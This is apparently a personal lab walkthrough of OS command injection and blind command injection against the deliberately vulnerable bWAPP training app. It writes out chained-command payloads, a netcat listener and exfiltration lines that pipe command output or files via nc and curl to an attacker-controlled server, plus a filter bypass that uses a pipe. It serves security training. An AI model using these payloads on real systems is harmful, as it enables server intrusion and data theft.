# **Command Injection**
# OS Command Injection is a vulnerability where an attacker can execute system (shell) commands on the server by injecting malicious input into an application that passes user input to the operating system.
#
## Step 1 
# Open bwapp and go to OS command Injection and set the severity to low
# This level is using the nslookup command to find the DNS records of the domain.
# lets try to use the command and try getting the information. 
example www.nse.gov |ls 
# This will list out the information of the domain. 
if we add whoami - www.nsa.gov | whoami 
# Result - www-data
# We can also use && and ; instead of pipe to get the details. 

## Step 2
# Set the severity to Medium 
# lets try using all the command which were added in the Step 1
# In this level, we will not be able to use ; and && as there is inout validation added in the code
# However, we can use | pipe to get the command executed

# For hard level the  escapeshellcmd(); has been added in the source code. so unabe to crack the hard level 



# **Command Injection - BLIND**
Blind command injection occurs when the system call that’s being made does not return the response of the call. 
Means when the command output is not displayed to us in the webpage, now how can we get to know that there is OS command injection when there is no output shown??

## Step 1
# set the severity level to low and try adding the IP address. 
# you will see a result as ` Did you captured our GOLDEN packet?`
# Here system commands will work but there are not visisble. Hence open a netcat listerner and and add the port on your terminal. 
# syntax - Target IP ; ls -la | nc (your IP) (Port)
# Add the IP address as per the syntax in the input field
# Open a terminal with nc listerner as nc -lvnp portno 
# Once we are run the command, we will be able to see the result on our terminal

BUT WHAT TO DO IF THE SERVER IS HOSTED ON A WINDOW MACHINE which do not have netcat by default so here we can use the curl command as type /path/to/file | curl –F “:data=@-“ http://our_malicious_server_ip/test.txt . 
This sends the file data to our server and we can see the contents in our error log files on our malicious server. 

## Step 2 
# Change the severity to Medium 
# In this level, we will not be able to use the above syntax as there is a inout validation of ; and &&.
# instead of using ; add | pipe sybol 
# example : Target IP | ls -la | nc (your IP) (Port)
# Open a nc listerner in the terminal and run the command. 
# You will be able to see the results on the ternminal. 

# Unable to bypass Hard level as again they are using escapeshellcmd(); function which ensure that user execute only one command 
# so we can’t chain the commands in this level.
